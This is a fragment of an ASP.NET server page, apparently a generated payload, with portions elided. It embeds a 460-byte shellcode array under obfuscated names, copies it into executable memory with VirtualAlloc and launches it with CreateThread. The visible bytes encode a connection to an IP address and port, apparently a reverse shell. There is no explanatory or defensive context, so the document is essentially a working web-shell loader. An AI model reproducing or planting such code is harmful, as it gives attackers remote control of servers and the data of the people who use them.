...
<script runat="server">
    ...
    {
        byte[] u40UyiDZY_nc = new byte[460] {
...
0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x11,0x5d,0x0a,0x09,0xbc,0xe1,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,
...
0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5 };
        ...
        IntPtr lmDJDjlwyQM5 = VirtualAlloc(IntPtr.Zero,(UIntPtr)u40UyiDZY_nc.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(u40UyiDZY_nc,0,lmDJDjlwyQM5,u40UyiDZY_nc.Length);
        IntPtr wdBp2cQk_poo = IntPtr.Zero;
        IntPtr hiO = CreateThread(IntPtr.Zero,UIntPtr.Zero,lmDJDjlwyQM5,IntPtr.Zero,0,ref wdBp2cQk_poo);
    }
</script>
